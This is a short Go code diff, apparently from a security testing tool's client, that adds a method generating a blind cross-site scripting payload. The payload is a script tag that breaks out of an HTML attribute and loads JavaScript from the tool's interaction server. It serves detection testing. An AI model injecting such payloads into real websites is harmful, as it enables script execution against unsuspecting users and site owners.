@@ -17,6 +17,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"path"
 	"strings"
 	"time"
 
@@ -448,6 +449,12 @@ func (c *Client) URL() string {
 	builder.WriteString(c.serverURL.Host)
 	URL := builder.String()
 	return URL
+}
+
+// URL returns a new URL that can be used for external interaction requests.
+func (c *Client) URLJs() string {
+	URL := c.URL()
+	return fmt.Sprintf("><script src=//%s></script>", path.Join(URL, server.JsEndpoint))
 }
 
 // decryptMessage decrypts an AES-256-RSA-OAEP encrypted message to string
